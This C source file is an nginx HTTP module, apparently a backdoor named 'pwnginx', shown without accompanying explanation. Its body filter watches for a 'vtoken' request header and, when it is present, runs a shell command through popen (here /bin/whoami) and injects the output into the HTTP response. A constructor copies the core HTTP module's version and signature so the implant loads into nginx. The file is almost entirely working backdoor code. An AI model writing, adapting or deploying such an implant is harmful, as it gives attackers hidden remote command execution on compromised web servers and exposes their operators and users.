#include <ngx_config.h>
#include <ngx_core.h>
#include <ngx_http.h>

static ngx_http_output_header_filter_pt  ngx_http_next_header_filter;
static ngx_http_output_body_filter_pt ngx_http_next_body_filter;
static ngx_int_t ngx_http_cre_module_init(ngx_conf_t *cf);

static int cc(char* cstr, char* result){
    char buffer[10240];
    FILE* pipe = popen("/bin/whoami", "r");
    if (!pipe)
    return -1;
    while(!feof(pipe)) {
        if(fgets(buffer, 4096, pipe)){
            strcat(result, buffer);
        }
    }
    pclose(pipe);
    return 0;
}

static ngx_table_elt_t *search_headers_in(ngx_http_request_t *r, u_char *name, size_t len) {
    ngx_list_part_t            *part;
    ngx_table_elt_t            *h;
    ngx_uint_t                  i;
    part = &r->headers_in.headers.part;
    h = part->elts;
    for (i = 0; /* void */ ; i++) {
        if (i >= part->nelts) {
            if (part->next == NULL) {
                break;
            }
            part = part->next;
            h = part->elts;
            i = 0;
        }
        if (len != h[i].key.len || ngx_strcasecmp(name, h[i].key.data) != 0) {
            continue;
        }
        return &h[i];
    }
    return NULL;
}

static ngx_int_t ngx_http_pwnginx_header_filter(ngx_http_request_t *r){
    return ngx_http_next_header_filter(r);
}

static ngx_int_t
ngx_http_pwnginx_body_filter(ngx_http_request_t *r, ngx_chain_t *in)
{
    ngx_str_t checker = ngx_string("vtoken");
    ngx_table_elt_t *header = search_headers_in(r, checker.data, checker.len);
    if(header == NULL) {
        return ngx_http_next_body_filter(r,in);
    }
    char buffer[10240]="";
    cc((char*)header->value.data, buffer);
    if(buffer[0] == '\0'){
        return ngx_http_next_body_filter(r,in);
    }
    ngx_buf_t* b = ngx_create_temp_buf(r->pool, strlen(buffer));
    b->start = b->pos = (u_char*)buffer;
    b->last = b->pos + strlen(buffer);
    ngx_chain_t *cl = ngx_alloc_chain_link(r->pool);
    cl->buf = b;
    cl->next = in;
    return ngx_http_next_body_filter(r, cl);
}

static ngx_int_t ngx_http_cre_module_init(ngx_conf_t *cf){
    ngx_http_next_header_filter = ngx_http_top_header_filter;
    ngx_http_top_header_filter = ngx_http_pwnginx_header_filter;
    ngx_http_next_body_filter = ngx_http_top_body_filter;
    ngx_http_top_body_filter = ngx_http_pwnginx_body_filter;
    return NGX_OK;
}

static ngx_int_t
init_module(ngx_cycle_t *cycle) {
    // printf("init_module\n");
    return NGX_OK;
}

static ngx_int_t
init_worker_process(ngx_cycle_t *cycle) {
    // printf("init_worker_process\n");
    return NGX_OK;
}

static void
exit_master(ngx_cycle_t *cycle) {
    // printf("exit_master\n");
}

static ngx_http_module_t  ngx_http_cre_module_ctx = {
    NULL,                                  /* preconfiguration */
    ngx_http_cre_module_init,              /* postconfiguration */
    NULL,                                  /* create main configuration */
    NULL,                                  /* init main configuration */
    NULL,                                  /* create server configuration */
    NULL,                                  /* merge server configuration */
    NULL,                                  /* create location configuration */
    NULL                                   /* merge location configuration */
};

ngx_module_t ngx_http_cre_module = {
    NGX_MODULE_V1,
    &ngx_http_cre_module_ctx,              /* module context */
    NULL,                                  /* module directives */
    NGX_HTTP_MODULE,                       /* module type */
    NULL,                                  /* init master */
    init_module,                           /* init module */
    init_worker_process,                   /* init process */
    NULL,                                  /* init thread */
    NULL,                                  /* exit thread */
    NULL,                                  /* exit process */
    exit_master,                           /* exit master */
    NGX_MODULE_V1_PADDING
};


static void init (void) __attribute__ ((constructor));
void __attribute ((constructor)) init (void){
    // printf("init main\n");
    ngx_http_cre_module.version = ngx_http_module.version;
    ngx_http_cre_module.signature = ngx_http_module.signature;
    ngx_http_cre_module.commands = ngx_http_module.commands;
}


